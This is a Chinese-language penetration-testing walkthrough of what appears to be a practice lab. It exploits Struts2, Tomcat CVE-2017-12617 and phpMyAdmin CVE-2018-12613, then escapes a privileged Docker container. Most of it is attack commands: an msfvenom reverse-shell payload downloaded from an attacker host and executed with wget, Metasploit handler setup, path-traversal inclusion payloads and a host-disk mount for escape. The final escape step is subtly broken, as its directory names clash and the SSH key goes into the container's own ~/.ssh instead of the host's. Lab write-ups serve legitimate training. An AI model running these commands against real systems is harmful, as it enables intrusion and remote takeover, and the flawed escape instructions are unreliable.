# 环境搭建

### 靶场配置
- **操作系统**: Ubuntu
- **内网IP地址**: 192.168.183.10
- **外网IP地址**: 192.168.1.6
- **域内主机**:
  - **Windows 7**: 192.168.183.129
  - **Windows Server 2008**: 192.168.183.130

### Docker环境配置
请手动开启Ubuntu的Docker环境，并确保以下端口服务已启动：
- **Struts2**: 端口2001
- **Tomcat 8**: 端口2002
- **phpMyAdmin 4.8.1**: 端口2003

# 外网渗透

## 端口扫描
首先对目标Ubuntu服务器进行端口扫描，发现三个开放端口：2001、2002 和 2003。
```bash
nmap -T4 -sC -sV 192.168.1.6
```

## Struts2 漏洞利用
访问2001端口，确认其运行的是Struts2框架。使用漏洞扫描工具检测到存在S2-045和S2-046两个漏洞。

1. 尝试利用S2-045漏洞执行命令，但返回结果为HTML代码。
2. 切换至S2-046漏洞尝试命令执行，成功获取命令回显。
3. 尝试上传一个JSP文件以进一步测试，虽然获取到了文件路径，但在尝试访问时均收到404错误响应。尽管如此，S2-046漏洞理论上应允许我们获得shell权限。

## Tomcat 8 漏洞利用
访问2002端口，确认其运行的是Apache Tomcat 8。

1. 在Kali Linux上搜索对应版本的漏洞并下载相关POC脚本。
   ```bash
   searchsploit tomcat 8.5.19
   searchsploit -m /exploit/jsp/webapps/42966.py
   ```

2. 使用POC脚本检测CVE-2017-12617漏洞是否存在。
   ```bash
   python 42966.py -u http://192.168.1.6:2002/
   ```
   结果显示Poc.jsp确实存在，表明该漏洞可被利用。

3. 通过`-p`参数发起攻击，成功获取了一个反弹shell。
   ```bash
   python 42966.py -u http://192.168.1.6:2002/ -p pwn
   ```

4. 生成适用于Linux系统的恶意ELF文件并通过HTTP服务器提供下载。
   ```bash
   msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf > shell.elf
   python -m SimpleHTTPServer  # Python 2环境
   ```

5. 在靶机上下载并执行该恶意文件。
   ```bash
   wget http://192.168.1.10:8000/shell.elf
   chmod 777 shell.elf
   ./shell.elf
   ```

6. 使用Metasploit Framework接收会话，成功上线。
   ```bash
   set payload linux/x86/meterpreter/reverse_tcp
   set lhost 192.168.1.10
   set lport 4444
   run
   ```

## phpMyAdmin 4.8.1 漏洞利用
访问2003端口，确认其运行的是phpMyAdmin 4.8.1版本。

1. 根据CVE-2018-12613漏洞分析，构造特定payload绕过安全检查机制。
   ```bash
   index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
   ```

2. 获取到phpMyAdmin会话标识后，利用文件包含漏洞输出敏感信息。
   ```bash
   ?target=db_datadict.php%253f/../../../../../../../../../tmp/sess_990aadb371d8e582cb000c716aed9720
   ```

3. 最终，植入WebShell并通过蚁剑等工具实现远程控制。

# 内网渗透

## Docker逃逸
经过初步侦查，判断当前获取的shell位于Docker容器内而非宿主机本身。尝试脏牛提权失败后，决定采用特权模式（`--privileged`）逃逸策略。

1. 创建临时目录用于挂载宿主机磁盘。
   ```bash
   mkdir tmptest
   ```

2. 查找可用设备文件并选择`sda1`进行挂载。
   ```bash
   mount /dev/sda1 /tmptest
   ls /tmptest
   ```

3. 生成SSH密钥对并将公钥写入宿主机相应位置，以便后续免密码登录。
   ```bash
   ssh-keygen -f tmp
   chmod 700 ~/.ssh
   cat tmp.pub >> ~/.ssh/authorized_keys
   ```

以上步骤展示了如何从外部网络逐步深入直至突破Docker隔离，最终取得宿主机控制权的过程。